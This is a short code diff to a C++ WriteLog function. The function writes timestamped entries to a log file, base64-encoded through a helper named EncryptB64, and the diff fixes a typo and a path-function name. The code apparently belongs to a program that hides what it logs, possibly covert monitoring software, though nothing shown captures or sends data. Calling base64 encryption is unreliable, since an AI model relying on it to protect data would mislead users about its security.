@@ -39,18 +39,18 @@ namespace IO
     template <class T>
     std::string WriteLog(const T &t)
     {
-        std::string path = GetOurPath(true);
+        std::string path = GetPath(true);
         Helper::DateTime dt;
-        std::dtring name = dt.GetDateTimeString("_") + ".log";
+        std::string name = dt.GetDateTimeString("_") + ".log";
         try
         {
             std::ofstream file(path + name);
-            if(!file) 
+            if(!file)
             return "";
             std::ostringstream s;
             s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
             std::string data = Base64::EncryptB64(s.str());
-            file<<data; 
+            file<<data;
             if(!file)
             return "";
             file.close();
@@ -60,7 +60,7 @@ namespace IO
         {
             return "";
         }
-        
+
     }
 }
 
